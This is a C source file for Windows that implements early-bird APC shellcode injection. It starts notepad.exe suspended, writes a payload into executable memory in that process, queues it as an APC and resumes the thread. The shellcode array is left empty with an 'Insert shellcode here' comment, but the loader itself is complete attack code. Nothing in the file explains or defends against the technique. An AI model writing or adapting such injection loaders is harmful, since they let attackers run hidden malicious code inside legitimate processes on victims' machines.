#include <windows.h>
#include <stdio.h>

unsigned char payload[] = ; // Insert shellcode here

int main()
{
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    si.cb = sizeof(si);

    printf("Creating process...\n");
    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "Failed to create process. Error: %lu\n", GetLastError());
        return 1;
    }
    printf("Process created.\n");

    if (WaitForSingleObject(pi.hProcess, 5000) == WAIT_FAILED) {
        fprintf(stderr, "Failed to wait for process. Error: %lu\n", GetLastError());
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }
    printf("Process wait completed.\n");

    HANDLE processHandle = pi.hProcess;
    HANDLE threadHandle = pi.hThread;

    printf("Allocating memory in remote process...\n");
    LPVOID buffer = VirtualAllocEx(processHandle, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (buffer == NULL) {
        fprintf(stderr, "Failed to allocate memory in remote process. Error: %lu\n", GetLastError());
        CloseHandle(processHandle);
        CloseHandle(threadHandle);
        return 1;
    }
    printf("Memory allocated.\n");

    printf("Writing to remote process memory...\n");
    if (!WriteProcessMemory(processHandle, buffer, payload, sizeof(payload), NULL)) {
        fprintf(stderr, "Failed to write to remote process memory. Error: %lu\n", GetLastError());
        VirtualFreeEx(processHandle, buffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        CloseHandle(threadHandle);
        return 1;
    }
    printf("Memory written.\n");

    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)buffer;

    printf("Queueing APC...\n");
    if (!QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL)) {
        fprintf(stderr, "Failed to queue APC. Error: %lu\n", GetLastError());
        VirtualFreeEx(processHandle, buffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        CloseHandle(threadHandle);
        return 1;
    }
    printf("APC queued.\n");

    printf("Resuming thread...\n");
    if (ResumeThread(threadHandle) == (DWORD)-1) {
        fprintf(stderr, "Failed to resume thread. Error: %lu\n", GetLastError());
        VirtualFreeEx(processHandle, buffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        CloseHandle(threadHandle);
        return 1;
    }
    printf("Thread resumed.\n");

    CloseHandle(processHandle);
    CloseHandle(threadHandle);
    return 0;
}